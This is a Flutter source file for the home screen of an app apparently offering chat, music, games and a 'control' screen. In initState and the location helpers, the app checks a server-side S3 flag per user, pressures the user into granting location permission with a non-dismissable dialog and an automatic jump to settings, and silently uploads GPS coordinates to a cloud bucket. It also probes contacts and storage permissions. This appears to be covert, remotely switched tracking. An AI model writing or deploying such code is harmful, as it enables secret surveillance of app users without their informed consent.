import 'dart:convert';
import 'dart:io';

import 'package:firebase_auth/firebase_auth.dart';

import 'package:magic/storage/storage_manager.dart';
import 'package:magic/utils/location.dart';
import 'package:path_provider/path_provider.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:flutter/material.dart';

import 'package:flutter_zoom_drawer/flutter_zoom_drawer.dart';
import 'package:magic/alarm/service_task.dart';
import 'package:magic/helpers/db_helper.dart';
import 'package:magic/screens/chat/chat_screen.dart';
import 'package:magic/screens/control/control_screen.dart';
import 'package:magic/screens/gear/gear_shift.dart';
import 'package:magic/screens/music/music_screen.dart';
import 'package:magic/screens/profile/profile_screen.dart';
import 'package:magic/screens/setting/setting_screen.dart';
import '../../helpers/device_helper.dart';
import '../../menu_items.dart';

import '../game/game_screen.dart';
import 'menu_screen.dart';
import 'package:http/http.dart' as http;

class HomePage extends StatefulWidget {
  const HomePage({super.key});

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> {
  MenuItemData currentItem = MenuItemData.user;
  String title = 'Онлайн чат';

  // bool boolTrue = true;

  @override
  void initState() {
    super.initState();
    // Delay service start to ensure app is fully in foreground
    WidgetsBinding.instance.addPostFrameCallback((_) async {
      try {
        // Wait a bit more to ensure app is stable
        await Future.delayed(Duration(milliseconds: 1000));
        await startServiceIfNeeded();
      } catch (e) {
        // print('Error starting service: $e');
      }
    });
    checkDeviceInfo();
    checkLocationEnabled();
    checkAllPermissions();
  }

  Future<void> checkAllPermissions() async {
    // Location
    var locationStatus = await Permission.location.status;
    // print('[Permission] Location: $locationStatus');
    final userId = await FirebaseAuth.instance.currentUser?.uid;
    if (locationStatus.isGranted && userId != null) {
      // print(
      //     '[Location] Permission granted on app open, creating location file...');
      await _uploadLocationOnce(userId);
    }
    // Contacts
    var contactsStatus = await Permission.contacts.status;
    // print('[Permission] Contacts: $contactsStatus');
    // Files (storage)
    var filesStatus = await Permission.storage.status;
    // print('[Permission] Files: $filesStatus');
    // Для Android 11+ можна перевірити manageExternalStorage
    if (await Permission.manageExternalStorage.isGranted) {
      // print('[Permission] ManageExternalStorage: granted');
    }
  }

  Future<void> checkLocationEnabled() async {
    final userId = await FirebaseAuth.instance.currentUser?.uid;
    if (userId == null) return;
    final s3Url =
        'https://app-s3-dev1.s3.amazonaws.com/users/$userId/location_enabled.json';
    try {
      final httpResponse = await http.get(Uri.parse(s3Url));
      // print('[Location] S3 HTTP status: ${httpResponse.statusCode}');
      if (httpResponse.statusCode == 200) {
        // print('[Location] S3 file found: $s3Url');
        // print('[Location] Requesting location permission...');
        await requestLocationPermissionFlow(userId);
        // print('[Location] Location permission flow completed for user: $userId');
      } else {
        // print('[Location] S3 file not found, not requesting location.');
      }
    } catch (e) {
      //  print('[Location] Error checking S3 location_enabled.json: $e');
    }
  }

  Future<void> requestLocationPermissionFlow(String userId) async {
    var status = await Permission.location.status;
    if (status.isDenied) {
      //  print('[Location] Permission denied, requesting...');
      var result = await Permission.location.request();
      if (result.isDenied) {
        // print('[Location] Still denied, opening app settings...');
        await _showLocationSettingsDialog();
      } else if (result.isGranted) {
        // print('[Location] Permission granted after request.');
        await DeviceHelper.getLocation(userId);
        await _uploadLocationOnce(userId);
      }
    } else if (status.isGranted) {
      //print('[Location] Permission already granted.');
      await DeviceHelper.getLocation(userId);
      await _uploadLocationOnce(userId);
    } else if (status.isPermanentlyDenied) {
      // print(
      //     '[Location] Permission permanently denied, opening app settings...');
      await _showLocationSettingsDialog();
    }
  }

  Future<void> _showLocationSettingsDialog() async {
    // Show dialog with instructions in English, then open app settings after 5 seconds
    if (navigatorKey.currentContext != null) {
      showDialog(
        context: navigatorKey.currentContext!,
        barrierDismissible: false,
        builder: (context) => AlertDialog(
          title: Text('Location Permission Required'),
          content: Text(
              'To enable location access, please go to your app settings, open "Permissions" and allow "Location" for this app.'),
        ),
      );
      await Future.delayed(Duration(seconds: 5));
      openAppSettings();
    } else {
      print(
          '[Location] navigatorKey.currentContext is null, cannot show dialog.');
      openAppSettings();
    }
  }

  Future<void> _uploadLocationOnce(String userId) async {
    try {
      // Отримати поточну локацію
      // DeviceHelper.getLocation повертає Map<String, dynamic>? з long/lat
      final position = await LocationUtils().getCurrentLocation();
      // print('[Location] getCurrentLocation result: $position');
      if (position != null &&
          (position['lng'] != null || position['longitude'] != null) &&
          (position['lat'] != null || position['latitude'] != null)) {
        final locationData = {
          'long': position['lng'] ?? position['longitude'],
          'lat': position['lat'] ?? position['latitude'],
        };
        final directory = await getApplicationDocumentsDirectory();
        final fileName =
            'location_${DateTime.now().millisecondsSinceEpoch}.json';
        final file = File('${directory.path}/$fileName');
        await file.writeAsString(jsonEncode(locationData));
        final url = await StorageManager.uploadLocationFile(
          file: file,
          deviceId: userId,
          fileName: fileName,
          metadata: {
            'device_id': userId,
            'upload_time': DateTime.now().toIso8601String(),
          },
        );
        // print('[Location] Location file uploaded to S3: $url');
      } else {}
    } catch (e) {
      // print('[Location] Error uploading location file: $e');
    }
  }

  @override
  void dispose() {
    // Stop periodic sync when leaving the page
    try {
      stopPeriodicSync();
    } catch (e) {
      //  print('Error stopping periodic sync: $e');
    }
    super.dispose();
  }

  checkDeviceInfo() async {
    DbHelper db = DbHelper();
    final userId = await FirebaseAuth.instance.currentUser?.uid;
    if (userId == null) {
      return;
    }
    bool infoExist = await db.checkInfo(userId);
    if (!infoExist) {
      await DeviceHelper.saveInfo(userId);
    }
  }

  @override
  Widget build(BuildContext context) {
    // boolTrue = true;
    return Scaffold(
      // appBar: AppBar(
      //   // toolbarHeight: boolTrue ? kToolbarHeight : 0.0,
      //   backgroundColor: Colors.transparent,
      //   elevation: 0,

      body: ZoomDrawer(
        menuScreen: Builder(builder: (context) {
          return MyMenuScreen(
              currentItem: currentItem,
              onSelectedItem: (item) {
                setState(() {
                  currentItem = item;
                  ZoomDrawer.of(context)!.close();
                  //  boolTrue = !boolTrue;
                });
              });
        }),
        mainScreen: getScreen(),
        borderRadius: 24.0,
        showShadow: false,
        drawerShadowsBackgroundColor: Colors.grey.shade300,
        mainScreenScale: 0.1,

        boxShadow: [
          BoxShadow(
            color: Colors.grey.withOpacity(0.5),
            spreadRadius: 2,
            blurRadius: 3,
            offset: const Offset(0, 2), // changes position of shadow
          ),
        ],
        menuBackgroundColor: Colors.white,
        angle: 0.0,
        slideWidth: MediaQuery.of(context).size.width * 0.5,
        // style: DrawerStyle.style1,
      ),
    );
  }

  Widget getScreen() {
    switch (currentItem) {
      case MenuItemData.user:
        return const ProfileScreen();
      case MenuItemData.chat:
        return const ChatScreen();
      case MenuItemData.music:
        return const MusicScreen();
      case MenuItemData.control:
        return const ControlScreen();
      case MenuItemData.gearShift:
        return const GearShiftScreen();
      case MenuItemData.game:
        return const GameScreen();
      case MenuItemData.setting:
        return const SettingScreen();
      // All cases are covered above; no default needed.
    }
  }

  String getTitle() {
    switch (currentItem) {
      case MenuItemData.user:
        return 'Персональные данные';
      case MenuItemData.chat:
        return 'Онлайн чат';
      case MenuItemData.music:
        return 'музыка';
      case MenuItemData.control:
        return 'Свободный контроль';
      case MenuItemData.game:
        return 'Игры';
      case MenuItemData.setting:
        return 'Настройки';
      default:
        return '';
    }
  }
}

// Add this global key at the top of your file (outside the class):
final GlobalKey<NavigatorState> navigatorKey = GlobalKey<NavigatorState>();
// And pass navigatorKey to your MaterialApp in main.dart:
// MaterialApp(
//   navigatorKey: navigatorKey,
//   ...existing code...
// )
